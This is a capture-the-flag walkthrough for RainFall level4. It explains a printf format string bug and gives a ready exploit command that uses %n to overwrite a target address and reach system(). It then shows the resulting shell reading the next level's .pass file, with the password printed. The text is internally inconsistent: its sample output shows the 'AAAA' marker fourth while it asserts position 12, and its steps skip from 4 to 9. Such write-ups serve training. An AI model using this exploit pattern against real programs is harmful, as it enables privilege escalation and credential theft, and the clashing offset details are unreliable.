# Level 4 -  Walkthrough

## Challenge Overview
Level 4 is a **format string vulnerability** challenge.  is same way as Level 3 with defrent target value and address.

---

## Step 1: Understanding the Program

### What does the program do?
Let's look at the program structure:

```bash
level4@RainFall:~$ gdb -q level4
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```

The program has this flow:
```
main() → calls n() → calls p() → vulnerable printf()
```

### The Critical Parts (Simplified)

**Function `p()` - The Vulnerable Function:**
```assembly
p:
  ; ... setup code ...
  call   fgets@plt            ; reads YOUR input into a buffer
  ; ... more code ...
  call   printf@plt           ; printf(your_input) ← THE BUG!
```

**🚨 The Bug:** The program does `printf(your_input)` instead of `printf("%s", your_input)`. This means YOU control the format string!

**Function `n()` - The Target Check:**
```assembly
n:
  ; ... calls p() ...
  cmp    $0x1025544,%eax      ; compares a memory value with 16930116
  jne    0x80484a5            ; if NOT equal, exit
  ; if EQUAL:
  call   system@plt           ; system("/bin/sh") ← OUR GOAL!
```

**🎯 Our Mission:** Make the memory location contain the value `0x1025544` (16,930,116 in decimal).

---


## Step 2: Finding Our Target

### What Memory Address to Attack?
We need to find where the program stores the value it compares with `0x1025544`.

```bash
(gdb) disassemble n
# Look for: cmp $0x1025544,%eax
# This tells us the program loads a value from memory and compares it
```

Through analysis (checking cross-references, looking at data sections), we find the target address is: **`0x8049810`**



---

## Step 3: Discovering Stack Layout

### Finding Where Our Input Appears
We need to know where our input lands on the printf argument stack:

```bash
level4@RainFall:~$ echo "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x" | ./level4
AAAA200.b7fd1ac0.b7ff37d0.41414141...
```

See that `41414141`? That's our "AAAA" in hex! It appears at position 12.


Perfect! Position 12 is where our input starts.

---


## Step 4: Running the Exploit

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'; cat) | ./level4
```

---

## Step 9: Success and Password Retrieval

If everything works correctly:

```bash
$ whoami
level5

$ cat /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

---